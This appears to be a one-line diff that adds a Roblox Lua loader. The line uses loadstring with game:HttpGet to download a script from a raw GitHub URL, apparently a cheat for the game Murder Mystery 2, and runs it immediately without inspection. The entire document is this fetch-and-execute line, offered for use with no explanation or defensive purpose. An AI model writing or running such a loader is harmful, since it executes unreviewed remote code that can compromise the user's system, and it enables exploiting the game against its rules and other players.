@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Psxvoidyx/Murdermysvoid2/main/Darkxyz23'),true))()
